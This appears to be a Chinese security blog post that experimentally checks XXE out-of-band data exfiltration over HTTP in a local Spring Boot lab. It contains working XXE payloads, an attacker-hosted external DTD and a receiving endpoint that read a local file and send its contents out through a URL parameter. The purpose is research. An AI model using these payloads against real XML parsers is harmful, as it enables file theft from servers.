>
> 本文章主要对xxe漏洞进行外带数据时，针对http外带数据所使用payload的可行性进行验证。本次实验基于SpringBoot搭建，所用jdk版本为1.8.0_202。  
> 本次仅针对了http协议的payload进行验证，其他协议payload的验证可以基于此实验代码进一步扩展验证  
> [相关代码仓库](https://github.com/2017libin/JavaSecDemo/tree/master)

# 0\. 结论

  1.  **需要外部实体引用** ：需要启动另外一台服务器，并在根目录下存放dtd文件，等待受害者发起请求。
  2. http协议只能外带 **单行文本** 。

# 1\. file协议

  * xml内容：在springboot中， **将xml文件放在resources下**

    
    
    <?xml version="1.0"?>
    <!DOCTYPE xdsec[
            <!ENTITY s1 SYSTEM "file:///C:/Users/libin/Desktop/hello.txt" >
            ]>
    <root>
        <a>&amps1</a>
    </root>
    

  2. 创建TestParseXML类用于解析xml文件

    
    
    package com.example.testdemo;
    
    import org.springframework.core.io.ClassPathResource;
    import org.w3c.dom.Document;
    import org.w3c.dom.Element;
    import org.w3c.dom.Node;
    import org.w3c.dom.NodeList;
    import org.xml.sax.InputSource;
    import javax.xml.parsers.DocumentBuilder;
    import javax.xml.parsers.DocumentBuilderFactory;
    import java.io.InputStream;
    
    public class TestParseXML {
        public static void domDemo() {
            try {
                // 加载XML文件，默认从resources文件下获取test.xml
                ClassPathResource resource = new ClassPathResource("test.xml");
                InputStream inputStream = resource.getInputStream();
    
                DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
                DocumentBuilder builder = factory.newDocumentBuilder();
                Document document = builder.parse(new InputSource(inputStream));
    
                // 解析内容并输出
                Element root = document.getDocumentElement();
                NodeList childNodes = root.getChildNodes();
                for (int i = 0; i < childNodes.getLength(); i++) {
                    if (childNodes.item(i).getNodeType() == Node.ELEMENT_NODE) {
                        Element childElement = (Element) childNodes.item(i);
                        // 读取元素内容
                        String tagName = childElement.getTagName();
                        String textContent = childElement.getTextContent();
                        System.out.println(tagName + ": " + textContent);
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    
        public static void main(String[] args) {
            domDemo();
        }
    }
    

  * 运行main函数发现可以通过xml读取文件

![image.png](https://image.3001.net/images/20230611/1686418973_6484b61de0e7f015ddaaa.png!small)

  * 将hello.txt的内容改为多行文本，结果也能正确输出

![image.png](https://image.3001.net/images/20230611/1686418994_6484b632b1b29f8cf7341.png!small)

# 2\. http外带数据 - 内部依赖

  * 新增路由 hack，用于接收数据

    
    
    package com.example.testdemo;
    
    import org.springframework.web.bind.annotation.RequestMapping;
    import org.springframework.web.bind.annotation.RestController;
    
    import javax.servlet.http.HttpServletRequest;
    
    /**
     * @Author libin
     * @Date 2023/6/10
     */
    @RestController
    public class TestGetRequest {
        @RequestMapping("/hack")
        public String test(HttpServletRequest request){
            try {
                String data = request.getParameter("data");
                System.out.println(data);
                return "success";
            } catch (Exception e){
                e.printStackTrace();
                return "error";
            }
        }
    }
    

  * xml数据为

    
    
    <?xml version="1.0"?>
    <!DOCTYPE xdsec[
            <!ENTITY % s1 SYSTEM "file:///C:/Users/libin/Desktop/hello.txt" >
            <!ENTITY s2 SYSTEM "http://127.0.0.1:8887/hack?data=%s1;" >
            ]>
    <root>
        <a>&amps2</a>
    </root>
    

  * 解析xml，输出结果为 `a: success`；而http服务器收到的data参数为null

![image.png](https://image.3001.net/images/20230611/1686419013_6484b645c11cdd251ccd9.png!small)

  * 修改xml数据为

    
    
    <?xml version="1.0"?>
    <!DOCTYPE xdsec[
            <!ENTITY % file SYSTEM "file:///C:/Users/libin/Desktop/helloSingleLine.txt">
            <!ENTITY % http "<!ENTITY send SYSTEM 'http://127.0.0.1:8887/hack?data=%file;'>">
            %http;
            ]>
    <root>
        <a>&ampsend</a>
    </root>
    

  * 重新进行解析，出现异常（下一节通过外部依赖来避免这个异常）

![image.png](https://image.3001.net/images/20230611/1686419029_6484b65514fef8cae9db4.png!small)

# 3\. http外带数据 - 外部依赖

  * 创建http.dtd文件，并在该目录下面启动http服务器（8777端口）：py -3 -m http.server 8777

    
    
    <!ENTITY % file SYSTEM "file:///C:/Users/libin/Desktop/helloSingleLine.txt">
    <!ENTITY % http "<!ENTITY send SYSTEM 'http://127.0.0.1:8887/hack?data=%file;'>">
    

  * 启动另外一台http服务器（8887端口），用于接收外带数据
  * 构造xml

    
    
    <?xml version="1.0" encoding="utf-8"?>
    <!DOCTYPE ANY [
            <!ENTITY % dtd PUBLIC "-//OXML/XXE/EN" "http://127.0.0.1:8777/http.dtd">
            %dtd;%http;
            ]>
    <root>
        <a>&ampsend</a>
    </root>
    

  * 解析xml，解析结果为`a: success`，观察http服务器（8887端口）输出，成功获得hello.txt的数据

![image.png](https://image.3001.net/images/20230611/1686419042_6484b6629676a1ec0e0b9.png!small)

  * 尝试读取包含多行数据的文件，解析xml时抛出异常

![image.png](https://image.3001.net/images/20230611/1686419059_6484b673c6f91613c416e.png!small)

